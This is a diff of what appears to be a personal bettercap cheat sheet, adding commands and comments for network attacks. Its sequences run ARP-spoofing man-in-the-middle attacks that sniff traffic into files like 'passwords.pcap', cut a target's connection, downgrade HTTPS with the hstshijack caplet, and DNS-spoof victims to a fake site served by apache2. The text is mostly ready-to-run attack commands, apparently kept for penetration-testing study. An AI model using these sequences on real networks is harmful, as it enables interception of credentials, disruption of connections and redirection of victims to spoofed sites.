@@ -3,6 +3,7 @@
 ## Cool applications can be found here:
 ## https://www.cyberpunk.rs/bettercap-usage-examples-overview-custom-setup-caplets
 ## The "events.stream" module is (or must be) always enabled
+## My repository of caplets is: github.com/gnebbia/bettercap_caplets
 
 ## We can automate stuff by using caplets, which are bettercap scripts
 ## Example of caplet for ARP Spoffing MiTM:
@@ -11,6 +12,7 @@ set arp.spoof.fullduplex true
 set arp.spoof.targets 192.168.1.5
 arp.spoof on
 set net.sniff.local true
+set net.sniff.output ‘passwords.pcap’
 net.sniff on
 
 
@@ -26,55 +28,77 @@ caplets.show
 # Get a list of available modules
 help
 
+# Get help for a specific module
+help <modulename>
+
 # Get a list of running (active) modules
+;; NOTE that the "events.stream" module should always be on
 active
 
 # Show help for a module (e.g., net.recon)
 help net.recon
 
 # Activate the module called "net.probe" which probes new hosts on the network by sending UDP packets
+;; note that net.probe activates also net.recon
 net.probe on
 
 # Show discovered targets
 net.show
 
 # Plain ARP Spoofing (doesn't work with encypted traffic)
+;; remember that you can put this commands in a file
+;; and launch bettercap with the caplet option
+;; bettercap -iface $interface -caplet $pathtospoofscript.cap
 help arp.spoof                    ;; view available options
 net.probe on
 set arp.spoof.fullduplex true     ;; poisons bidirectionally
 set arp.spoof.targets $IPaddress
 arp.spoof on
-set net.sniff.local true
+set net.sniff.local true          ;; sniff also local data
 arp.sniff on
 
 # Cut connection on the target with ARP Spoofing
 set arp.spoof.targets $IPaddress
 arp.ban on
 
-# Basic HTTPS ARP Spoofing
-help arp.spoof                    ;; view available options
-net.probe on
-set arp.spoof.fullduplex true     ;; poisons bidirectionally
-set arp.spoof.targets $IPaddress
-arp.spoof on
-set net.sniff.local true
-arp.sniff on
-
-# HSTS HTTPS Partial Bypass ARP Spoofing
+# Basic HTTPS ARP Spoofing (Will not bypass HSTS, just downgrades https->http)
 net.probe on
 set arp.spoof.fullduplex true
 set arp.spoof.targets 192.168.1.5
 arp.spoof on
 set net.sniff.local true
+set net.sniff.output 'capture1.pcap'
 net.sniff on
+;; edit the hstshijack replacements strings
 hstshijack/hstshijack             ;; run the hstshijack caplet
 
-# DNS Spoofing (Does not bypass HSTS) --- FIX THIS 
+
+# Basic HTTPS ARP Spoofing with caplets (Will not bypass HSTS, just downgrades https->http)
+;; this is a combination of arpspoof and hstshijack
+;; get the caplets from github.com/gnebbia/bettercap_caplets
+;; substitute the hstshijack from the bettercap folder with
+;; the one from the repo.
+;; To check caplets path either use find or caplets.show from bettercap
+bettercap -iface eth0 -caplet /path/to/arpspoofcaplet.cap
+;; edit the hstshijack replacements strings in the caplet .cap file manually
+set net.sniff.output 'capture1.pcap'
+hstshijack/hstshijack 
+
+
+# DNS Spoofing (Does not bypass HSTS)
+;; Here a user is dns spoofed to our webserver
+;; again, this does not bypass HSTS
 systemctl start apache2 (or use docker)
+;; insert our fake website on apache2
 net.probe on
 set arp.spoof.fullduplex true
 set arp.spoof.targets 192.168.1.5
 arp.spoof on
 set net.sniff.local true
+set net.sniff.output 'capture1.pcap'
 net.sniff on
+;; or  we could have just run the arpspoof caplet
+set dns.spoof.address $myIP ;; note that this is generally already set by default
+set dns.spoof.all true
+set dns.spoof.domains gnebbia.ml,*.gnebbia.ml
 dns.spoof on
